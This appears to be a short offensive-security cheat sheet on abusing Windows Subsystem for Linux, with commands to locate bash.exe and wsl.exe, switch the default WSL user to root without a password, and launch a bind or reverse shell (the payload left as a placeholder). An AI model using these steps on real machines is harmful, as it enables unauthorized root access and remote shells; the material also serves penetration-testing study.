### Finding bash.exe and wsl.exe
##### Oneliner to find bash.exe
```powershell
where /R c:\windows bash.exe
```

##### Oneliner to find wsl.exe
```powershell
where /R c:\windows wsl.exe
```

##### Check the current user in wsl
```powershell
<full path of wsl.exe>/wsl.exe whoami
```

**Note** - bash.exe will pop a linux bash shell which can be used to run linux commands 

*With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ .exe --default-user root. Now start your bind shell or reverse.*

```powershell
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

-> Binary `bash.exe` can also be found in 
```powershell
C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
```
-> Alternatively you can explore the `WSL` filesystem in the folder 
```powershell
C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\
```